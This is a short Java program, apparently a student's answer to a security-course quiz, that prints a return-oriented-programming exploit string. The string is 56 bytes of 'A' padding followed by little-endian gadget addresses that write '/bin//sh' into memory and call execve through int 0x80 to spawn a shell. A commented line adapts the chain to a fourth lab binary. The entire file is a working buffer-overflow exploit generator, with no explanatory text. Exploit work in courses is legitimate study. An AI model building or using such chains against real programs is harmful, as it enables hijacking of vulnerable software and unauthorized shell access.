package QUIZ2;

import java.util.Scanner;

public class RopChain {
	
	
	
/*
	g1 pop %eax pop %ebx 
	g2 xor %eax,%eax
	g3 mov %eax,(%ebx) 
	g4 mov %eax,%ebx
	g5 xor %ecx,%ecx 
	g6 xor %edx,%edx
	g7 mov $0xb,%al 
	g8 int $0x80

*/
	
	static int amountOfA=56;
	
	static int bin=0x6e69622f;
	static int sh=0x68732f2f;
	
	static int[] g= {
			0x00000000,    // g0 -empty
			0x70483bd,    // g1 
			0x70483c0,    // g2 
			0x70483c3,    // g3 
			0x70483c6,    // g4 
			0x70483c9,    // g5 
			0x70483cc,    // g6 
			0x70483cf,    // g7 
			0x70483d2     // g8 
	};

	static int data= 0x0804a058;
	
	
	
	
	static String hex="";
	
	public static void changeString() {
		char temp=92;
		hex+=temp;
		temp=120;
		hex+=temp;
	}
	
	public static String littleEndian(int num) {
		String l="";
		String output="";
		l=Integer.toHexString(num);
		while(l.length()<8)
			l="0"+l;
		for(int i=6;i>=0;i-=2) {
			output+=hex;
			output+=l.charAt(i);
			output+=l.charAt(i+1);
		}
		return output;
	}
	
	public static void main(String[] args) {
		changeString();
		//System.out.println("Hex:"+hex);
		String output="";
		
		
		for(int i=0;i<amountOfA;i++)
			output+='A';
		
		output+=littleEndian(g[1]);
		output+=littleEndian(bin);
		output+=littleEndian(data);
		output+=littleEndian(g[3]);
		output+=littleEndian(g[1]);
		output+=littleEndian(sh);
		output+=littleEndian(data+4);
		output+=littleEndian(g[3]);
		
		// FOR BINARY 4 UNCOMMENT THIS CODE
		// output+=littleEndian(g[1]);output+="AAAA";output+=littleEndian(data+8);output+=littleEndian(g[2]);output+=littleEndian(g[3]);
		
		output+=littleEndian(g[1]);
		output+=littleEndian(data);
		output+="AAAA";
		output+=littleEndian(g[4]);
		output+=littleEndian(g[2]);
		output+=littleEndian(g[5]);
		output+=littleEndian(g[6]);
		output+=littleEndian(g[7]);
		output+=littleEndian(g[8]);
		
		
		
		
		System.out.print(output);
	}

}
